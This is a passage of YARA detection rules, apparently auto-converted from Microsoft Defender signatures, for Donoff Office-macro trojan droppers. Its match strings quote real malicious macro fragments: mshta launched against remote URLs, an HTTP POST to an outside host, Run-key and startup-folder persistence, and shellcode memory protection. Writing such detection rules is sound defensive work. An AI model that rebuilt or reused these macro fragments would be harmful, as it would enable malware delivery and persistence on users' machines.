        detection_name = "TrojanDropper:O97M/Donoff.PK!MSR"
        threat_id = "2147779248"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"s\" & \"c\" & \"he\" & \"du\" & \"le\" & \".\" & \"s\" & \"e\" & \"r\" & \"vic\" & \"e\"" ascii //weight: 1
        $x_1_2 = "= \".\" & \"e\"" ascii //weight: 1
        $x_1_3 = "= writeToFile(p & \"b.doc\", tOut)" ascii //weight: 1
        $x_1_4 = "= \"x\" & \"e\"" ascii //weight: 1
        $x_1_5 = "= publicpath & bslash & \"do\" & \"c\" & \"u\" & \"m\" & \"e\" & \"nt\" & \"s\" & bslash" ascii //weight: 1
        $x_1_6 = "= StrConv(\"PF&5NQK*mR^x94GE6HaU>%M;L{17/}@lDXgWq,ovitj`s~$fASyJcOd :rT8bV3-0\", vbFromUnicode)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDropper_O97M_Donoff_DRL_2147784674_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.DRL!MTB"
        threat_id = "2147784674"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".\\root\\cimv2" ascii //weight: 1
        $x_1_2 = "winmgmts:root\\cimv2:Win32_Process" ascii //weight: 1
        $x_1_3 = "\"powe\"" ascii //weight: 1
        $x_1_4 = "x + \"rshe\"" ascii //weight: 1
        $x_1_5 = "x + \"ll /c \"" ascii //weight: 1
        $x_1_6 = "appData + \"\\calc.exe\"" ascii //weight: 1
        $x_1_7 = "y, Null, objConfig, intProcessID" ascii //weight: 1
        $x_1_8 = ".SpawnInstance_" ascii //weight: 1
        $x_1_9 = "errReturn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_STD_2147811910_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.STD!MTB"
        threat_id = "2147811910"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"C:\\Users\\Public\\calc.com \"\"http://documents.pro.br/injction.mp3\"\"\", vbNormalFocus)" ascii //weight: 1
        $x_1_2 = "fso.copyfile \"C:\\Windows\\System32\\mshta.exe\", Environ(\"PUBLIC\") & \"\\calc.com\", True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_STE_2147811911_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.STE!MTB"
        threat_id = "2147811911"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \" http://documents.pro.br/\"" ascii //weight: 1
        $x_1_2 = "GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create MicrosoftCDT2022, Null, Null, pid" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_STE_2147811911_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.STE!MTB"
        threat_id = "2147811911"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "FOVure.Open (MIAiN + \"\\SbYKO.js\")" ascii //weight: 1
        $x_1_2 = {49 66 20 44 69 72 28 4d 49 41 69 4e 20 2b 20 22 5c 53 62 59 4b 4f 2e 74 78 74 22 29 20 3d 20 22 22 20 54 68 65 6e [0-3] 41 70 70 6c 69 63 61 74 69 6f 6e 2e 57 61 69 74 20 28 4e 6f 77 20 2b 20 54 69 6d 65 56 61 6c 75 65 28 22 [0-15] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "FOVure.Namespace(MIAiN).Self.InvokeVerb \"Paste\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_STE_2147811911_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.STE!MTB"
        threat_id = "2147811911"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(\"win\" & \"mgm\" & \"ts\" & \":w\" & \"in\" & \"32_\" & \"pr\" & \"oc\" & \"es\" & \"s\")" ascii //weight: 1
        $x_1_2 = "\"h\" & \"ttp\" & \"://\" & \"as\" & \"en\" & \"al\" & \".m\" & \"edi\" & \"anew\" & \"sonl\" & \"ine\" & \".c\" & \"om/\" & \"go\" & \"od/\" & \"luc\" & \"k/\" & \"fl\" & \"av\" & \"or/\" & \"lis\" & \"t.\" & \"ph\" & \"p" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_AG_2147816347_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.AG!MSR"
        threat_id = "2147816347"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "uu = \"C:\\Users\\\" + Application.UserName + \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DnsSystem.exe\"" ascii //weight: 2
        $x_1_2 = "arrSplitStrings10 = Split(ActiveDocument.TextBox1.Value, \",\")" ascii //weight: 1
        $x_1_3 = "arrSplitStrings2(i) = Replace(arrSplitStrings10(i)," ascii //weight: 1
        $x_1_4 = "fileNmb = FreeFile" ascii //weight: 1
        $x_1_5 = "Put #fileNmb, 1, arrSplitStrings2" ascii //weight: 1
        $x_1_6 = "Sub AutoClose()" ascii //weight: 1
        $x_1_7 = "strFileExists = Dir(uu)" ascii //weight: 1
        $x_1_8 = "Open uu For Binary Access Write As #fileNmb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_AG_2147816347_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.AG!MSR"
        threat_id = "2147816347"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Declare Function VirtualProtect Lib \"kernel32\" Alias \"VirtualProtect\"" ascii //weight: 1
        $x_1_2 = "Private Declare Function KillTimer Lib \"user32\" Alias \"KillTimer\"" ascii //weight: 1
        $x_1_3 = "content = byteshex(ActiveDocument.BuiltInDocumentProperties(\"Company\").Value)" ascii //weight: 1
        $x_1_4 = ".BuiltInDocumentProperties(\"Category\").Value)" ascii //weight: 1
        $x_1_5 = "VirtualProtect shellCode, Length, 64, VarPtr(v)" ascii //weight: 1
        $x_1_6 = "GetObject(\"new:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\").Environment(\"Process\")(\"{FCF2382A-4DD7-4FBE-9E77-0EE3DD66379A}\") = ActiveDocument.FullName" ascii //weight: 1
        $x_1_7 = "(\"{1F79AEE7-7F65-4B80-A1C6-E5C90A7BE6CF}\") = \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_RPI_2147830171_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.RPI!MTB"
        threat_id = "2147830171"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(strreverse(\"0.6.ptthlmxrevres.2lmxsm\"))winhttpreq.open\"post\",\"https://bdvoltaire-b8da.restdb.io/rest/doccument\"" ascii //weight: 1
        $x_1_2 = "=getobject(\"winmgmts:{impersonationlevel=impersonate}!\\\\.\\root\\default:stdregprov\")r=oreg.setstringvalue(hkey_current_user,strreverse(\"nur\\noisrevtnerruc\\swodniw\\tfosorcim\\erawtfos\"),n,strreverse(\"exe.tsohnoc\\23metsys\\swodniw\\:c\")&v)endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_PDA_2147833344_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.PDA!MTB"
        threat_id = "2147833344"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "_shoby_name=\"wlthganky\"folder_shoby_name=environ$(" ascii //weight: 1
        $x_1_2 = "=activedocumentdocuments.openpath_shoby_filedocnew.closeendsub" ascii //weight: 1
        $x_1_3 = "shellpath_shoby_file&\".ex\"&\"e\",vbnormalnofocuscallshoby_docl" ascii //weight: 1
        $x_1_4 = "fori=0toubound(awr1shoby_s)-lbound(awr1shoby_s)shoby_bweyt(i)=awr1shoby_s(i)nextopenpath_shoby_file&\".e\"&\"xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Donoff_GA_2147960117_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Donoff.GA!MSR"
        threat_id = "2147960117"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 75 6e 63 74 69 6f 6e 20 [0-13] 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 4c 6f 61 64 4c 69 62 72 61 72 79 41 22 20 28 42 79 56 61 6c 20 [0-17] 20 41 73 20 53 74 72 69 6e 67 29 20 41 73 20 4c 6f 6e 67 50 74 72}  //weight: 2, accuracy: Low
        $x_2_2 = "folderpath = \"C:\\ProgramData\\WPSOffice" ascii //weight: 2
        $x_2_3 = "loaderpath = folderpath & \"\\wpsoffice_aam.ocx" ascii //weight: 2
        $x_1_4 = "ExtractLoader (loaderpath)" ascii //weight: 1
        $x_1_5 = "tcueomylalbo (loaderpath)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

